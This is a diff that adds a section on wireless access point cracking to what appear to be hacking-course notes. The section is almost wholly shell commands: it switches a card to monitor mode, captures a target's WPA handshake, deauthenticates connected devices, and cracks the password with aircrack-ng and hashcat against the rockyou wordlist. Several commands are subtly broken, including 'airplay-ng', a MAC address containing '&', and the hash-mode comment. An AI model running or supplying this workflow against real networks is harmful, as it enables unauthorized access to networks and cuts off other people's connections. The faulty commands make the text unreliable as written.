@@ -187,3 +187,39 @@ sudo scapy
 >>> send(packet, verbose=False)
 ```
 
+## Section 16: Bonus: Wireless Access Point Cracking
+* Putting Wireless Card In Monitor Mode
+```bash
+ifconfig
+iwconfig
+ifconfig wlo1 down
+iwconfig wlo1 mode monitor
+ifconfig wlo1 up
+```
+* Deauthenticating Devices & Grabbing Password
+```bash
+airmon-ng check wlo1
+airmon-ng check kill
+airodump-ng wlo1
+# channel 2, mac_address 34:DA:B&:89:DB:A4, output_file TAKMICAR_test
+airodump-ng -c 2 --bssid 34:DA:B&:89:DB:A4 -w TAKMICAR_test wlo1
+
+# deauthenticate
+airplay-ng -0 0 -a 34:DA:B&:89:DB:A4 wlo1 
+# keep .cap file
+```
+* Aircrack Password Cracking
+```bash
+# file the password list
+locate rockyou.txt
+cp /usr/share/wordlists/rockyou.txt.gz /home/mrhacker/Desktop
+gzip -d rockyou.txt.gz
+aircrack-ng -w rockyou.txt TAKMICAR_test-01.cap
+```
+* Hashcat Password Cracking
+```bash
+hashcat --help
+# password_hash WPA-EAPOL_BPKDF2 (2500)
+# converse cap to hccapx (google cap to hccapx)
+hashcat -a 0 -m 2500 1b05515dbe.hccapx rockyou.txt 
+```
